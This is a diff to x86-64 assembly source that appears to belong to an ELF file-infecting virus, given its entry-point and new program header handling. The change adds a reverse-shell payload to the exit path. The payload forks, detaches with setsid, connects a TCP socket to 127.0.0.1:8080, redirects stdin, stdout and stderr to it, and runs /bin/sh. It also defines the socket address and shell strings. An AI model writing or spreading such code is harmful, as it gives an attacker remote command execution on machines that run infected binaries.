@@ -38,8 +38,8 @@ _start:
 
 	mov		rax, SYS_fork
 	syscall
-	cmp		rax, 0
-	jna		.continue_fork
+	cmp		eax, 0
+	jng		.continue_fork
 
 	mov		rax, [rel entry]
 	mov		[rel new_entry], rax
@@ -792,15 +792,60 @@ end_:
 
 	.just_quit:
 		POP_ALL
-		mov		al, BYTE [rel zero]
-		test	al, al
-		jz		.exit_ret
 
-		mov		rax, 15
-		call	print_rax
+		mov		rax, SYS_fork
+		syscall
 
+		cmp		eax, 0
+		jng		.continue_fork
+
+		mov		rax, SYS_exit
+		xor		rdi, rdi
+		syscall
+
+	.continue_fork:
+		mov		rax, SYS_setsid
+		syscall
+
+		mov		rax, SYS_socket
+		mov		rdi, AF_INET
+		mov		rsi, SOCK_STREAM
+		xor		rdx, rdx
+		syscall
+		mov		r12, rax
+
+		mov		rax, SYS_connect
+		mov		rdi, r12
+		lea		rsi, [rel serv_addr]
+		mov		rdx, 16
+		syscall
+		test	rax, rax
+		jnz		.exit_ret
+
+		mov		rax, SYS_dup2
+		mov		rdi, r12
+		mov		rsi, 0
+		syscall
+		mov		rax, SYS_dup2
+		mov		rdi, r12
+		mov		rsi, 1
+		syscall
+		mov		rax, SYS_dup2
+		mov		rdi, r12
+		mov		rsi, 2
+		syscall
+		lea		rax, [rel arg0]
+		mov		[rel argv], rax
+		mov		rax, SYS_execve
+		lea		rdi, [rel shell]
+		lea		rsi, [rel argv]
+		xor		rdx, rdx
+		syscall
 
 	.exit_ret:
+		mov		rax, SYS_close
+		mov		rdi, r12
+		syscall
 
 		mov		rax, SYS_exit
 		xor		rdi, rdi
@@ -823,6 +868,14 @@ end_:
 	paddi	dq 0
 	entry	dq 0
 	exec	dd 7
+	serv_addr:
+		dw AF_INET
+		dw 0x901F			; 8080
+		dd 0x0100007F		; 127.0.0.1
+		times 8 db 0
+		shell:	db '/bin/sh', 0
+		arg0:       db "sh", 0
+		argv:       dq 0, 0
 
 ; NEW HEADER
 new_programheader:
